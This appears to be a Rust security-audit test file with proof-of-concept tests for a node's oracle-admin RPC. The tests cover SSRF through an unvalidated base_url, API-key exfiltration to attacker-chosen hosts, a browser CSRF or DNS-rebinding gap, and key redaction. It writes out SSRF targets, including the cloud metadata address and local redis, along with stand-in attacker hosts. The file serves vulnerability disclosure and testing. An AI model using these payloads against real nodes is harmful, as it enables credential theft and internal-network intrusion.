//! GATE 3 (security, cycle 5) proof-of-concept tests for the new attack surface:
//!   * the loopback-only oracle-admin RPC (`ubi_getOracleConfig`/`ubi_setOracleConfig`),
//!   * the SSRF / config-injection reachable through `base_url`,
//!   * secret redaction in the admin response,
//!   * the loopback gate's exact semantics (TCP-peer based, not header-spoofable).
//!
//! These drive the real `build_module` `RpcModule` directly and inject the caller's peer `SocketAddr`
//! into the module extensions exactly the way `serve`'s accept loop injects it per request. They are
//! offline (I5): the SSRF is demonstrated by showing the attacker-chosen `base_url` flows, **unvalidated
//! and unredacted**, into the live backend config that the node will issue HTTP requests against (a
//! captured live exfiltration PoC against :38545 is documented in the report). A stub factory stands in
//! for the node's `ubi2-oracle` factory so the swap path runs without a network.
//!
//! Findings exercised here:
//!   * C5-SEC-1 (Critical) — SSRF + key exfiltration via unvalidated `base_url`.
//!   * C5-SEC-2 (High)     — browser CSRF / DNS-rebinding: the only gate is the TCP-peer loopback check.
//!   * C5-SEC-4 (info)     — secret redaction holds (the raw key never surfaces in the admin response).
//!
//! A separate live capture (documented, run against a real node on :38545) confirmed the operator's
//! `OPENAI_API_KEY` is sent as a `Bearer` token to an attacker-chosen `base_url`, and that a live
//! backend invocation panics the block-production task (C5-SEC-3, High — availability/DoS).

use std::net::SocketAddr;
use std::sync::{Arc, Mutex};

use serde_json::json;
use ubi2_rpc::oracle_admin::MockFactory;
use ubi2_rpc::{
    build_module, BuiltOracle, Chain, OracleAdmin, OracleConfig, OracleFactory, OracleHealth,
    DEVNET_CHAIN_ID,
};
use ubi2_runtime::{MockInterpreter, MockOracle};

const LOOPBACK: &str = "127.0.0.1:54321";
const NON_LOOPBACK: &str = "203.0.113.7:443";

/// Recorded `(base_url, raw_api_key)` pairs the factory was asked to dial with.
type Seen = Arc<Mutex<Vec<(Option<String>, Option<String>)>>>;

/// A factory that records the `base_url`/`api_key` it is asked to build with, so a test can assert what
/// the node would actually dial. It "builds" a reachable backend from any config (no validation), which
/// is exactly the behavior under test: there is NO allowlist/scheme/host check on `base_url` today.
#[derive(Default)]
struct SpyFactory {
    seen: Seen,
}

impl OracleFactory for SpyFactory {
    fn build(&self, cfg: &OracleConfig, api_key: Option<&str>) -> Result<BuiltOracle, String> {
        self.seen
            .lock()
            .unwrap()
            .push((cfg.base_url.clone(), api_key.map(str::to_string)));
        Ok(BuiltOracle {
            oracle: Arc::new(MockOracle::default()),
            interpreter: Arc::new(MockInterpreter::default()),
            health: OracleHealth {
                provider: cfg.provider.clone().unwrap_or_default(),
                model: cfg.model.clone().unwrap_or_else(|| "spy-model".into()),
                reachable: true,
                error: String::new(),
            },
        })
    }
    fn mock(&self) -> BuiltOracle {
        MockFactory.mock()
    }
}

fn module_with_spy(peer: &str) -> (jsonrpsee::RpcModule<Chain>, Seen) {
    let seen = Arc::new(Mutex::new(Vec::new()));
    let factory = Arc::new(SpyFactory { seen: seen.clone() });
    let admin = Arc::new(OracleAdmin::new(factory, OracleConfig::default()));
    let chain = Chain::new(DEVNET_CHAIN_ID, 1_700_000_000).with_oracle_admin(admin);
    let mut m = build_module(chain);
    let addr: SocketAddr = peer.parse().unwrap();
    m.extensions_mut().insert(addr);
    (m, seen)
}

async fn call(
    m: &jsonrpsee::RpcModule<Chain>,
    method: &str,
    params: serde_json::Value,
) -> serde_json::Value {
    let req = json!({ "jsonrpc": "2.0", "id": 1, "method": method, "params": params }).to_string();
    let (resp, _rx) = m.raw_json_request(&req, 1).await.expect("call");
    serde_json::from_str(&resp).expect("json")
}

/// C5-SEC-1 (Critical): `ubi_setOracleConfig(base_url=...)` accepts an arbitrary, attacker-chosen URL
/// with NO validation (no scheme allowlist, no host/port/loopback-target check). The node will then
/// issue its provider HTTP requests — carrying the API key — against that URL. This PoC proves the
/// hostile `base_url` flows straight through to the factory the node dials with the raw key.
#[tokio::test]
async fn ssrf_base_url_flows_unvalidated_to_the_backend_with_the_key() {
    let (m, seen) = module_with_spy(LOOPBACK);

    // An attacker repoints the node's OpenAI backend at an internal metadata endpoint (or their own
    // server) and rides the supplied key. There is no validation that rejects this.
    let attacker_url = "http://169.254.169.254/latest/meta-data";
    let params = json!([{
        "provider": "openai",
        "model": "gpt-4o",
        "base_url": attacker_url,
        "api_key": "sk-operator-secret-key"
    }]);
    let set = call(&m, "ubi_setOracleConfig", params).await;
    assert!(
        set.get("error").is_none(),
        "set unexpectedly rejected: {set}"
    );
    assert_eq!(set["result"]["active"], json!("live"));

    // The factory (the seam the node dials) was handed BOTH the attacker URL and the raw key. Nothing
    // upstream filtered the URL. This is the SSRF + key-exfiltration primitive.
    let seen = seen.lock().unwrap();
    let (base, key) = seen.last().expect("factory was invoked");
    assert_eq!(
        base.as_deref(),
        Some(attacker_url),
        "base_url reached the backend unvalidated — SSRF primitive present"
    );
    assert_eq!(
        key.as_deref(),
        Some("sk-operator-secret-key"),
        "the raw API key is handed to the attacker-controlled endpoint"
    );
}

/// C5-SEC-1, internal-target variant: loopback / link-local / file-ish bases are all accepted. This
/// documents the class of SSRF targets reachable with no allowlist.
#[tokio::test]
async fn ssrf_internal_targets_are_not_rejected() {
    for target in [
        "http://127.0.0.1:9000/admin",        // another local service
        "http://169.254.169.254/",            // cloud metadata
        "http://[::1]:6379/",                 // local redis
        "http://internal.svc.cluster.local/", // k8s internal
    ] {
        let (m, _seen) = module_with_spy(LOOPBACK);
        let set = call(
            &m,
            "ubi_setOracleConfig",
            json!([{ "provider": "openai", "base_url": target }]),
        )
        .await;
        assert!(
            set.get("error").is_none(),
            "internal SSRF target {target} should be rejected but was accepted: {set}"
        );
        assert_eq!(set["result"]["active"], json!("live"), "{target} went live");
    }
}

/// C5-SEC-2 (High): the ONLY gate is the TCP-peer loopback check. A browser request from a malicious
/// page is delivered from the loopback interface, so the peer IS 127.0.0.1 and the call is accepted —
/// regardless of the `Origin`. We model the browser request as a loopback-peer call: it succeeds, which
/// is the CSRF / DNS-rebinding exposure (there is no Origin allowlist / CSRF token / Host pinning).
#[tokio::test]
async fn browser_csrf_shape_is_accepted_because_only_tcp_peer_is_checked() {
    // A page on https://evil.example.com causes the victim's browser to POST to 127.0.0.1 — the peer is
    // loopback, so the admin gate passes. (The live server also answers with `access-control-allow-origin: *`,
    // see the report; here we assert the request itself is authorized purely by being loopback.)
    let (m, _seen) = module_with_spy(LOOPBACK);
    let set = call(
        &m,
        "ubi_setOracleConfig",
        json!([{ "provider": "ollama", "base_url": "http://attacker.evil:1234" }]),
    )
    .await;
    assert!(
        set.get("error").is_none(),
        "loopback-peer admin call is accepted with no origin/CSRF defense: {set}"
    );
    assert_eq!(
        set["result"]["config"]["base_url"],
        json!("http://attacker.evil:1234")
    );
}

/// The loopback gate IS real at the TCP layer: a non-loopback peer is rejected, and (crucially) it is
/// the peer SocketAddr — not any `Host`/`X-Forwarded-For`/`Forwarded` header — that decides. Header
/// spoofing cannot reach the admin methods because the gate never consults a header. Both admin methods
/// reject a non-loopback caller with -32099.
#[tokio::test]
async fn non_loopback_peer_is_rejected_and_headers_cannot_override() {
    let (m, _seen) = module_with_spy(NON_LOOPBACK);
    for method in ["ubi_getOracleConfig", "ubi_setOracleConfig"] {
        let resp = call(&m, method, json!([{ "provider": "openai" }])).await;
        assert_eq!(
            resp["error"]["code"],
            json!(-32099),
            "{method} must reject a non-loopback peer"
        );
    }
}

/// C5-SEC-4 (info / passing control): the raw key is redacted everywhere in the admin response and the
/// persisted config shape — only the provider/model/base_url survive, never the key value.
#[tokio::test]
async fn raw_api_key_never_surfaces_in_the_admin_response() {
    let (m, _seen) = module_with_spy(LOOPBACK);
    let secret = "sk-this-must-never-surface-abc123";
    let set = call(
        &m,
        "ubi_setOracleConfig",
        json!([{ "provider": "openai", "model": "gpt-4o", "base_url": "https://api.openai.com", "api_key": secret }]),
    )
    .await;
    let body = serde_json::to_string(&set).unwrap();
    assert!(
        !body.contains(secret),
        "raw key leaked in set response: {body}"
    );

    let got = call(&m, "ubi_getOracleConfig", json!([])).await;
    let body = serde_json::to_string(&got).unwrap();
    assert!(
        !body.contains(secret),
        "raw key leaked in get response: {body}"
    );
    assert!(
        !body.contains("api_key\""),
        "no api_key field is exposed: {body}"
    );
}
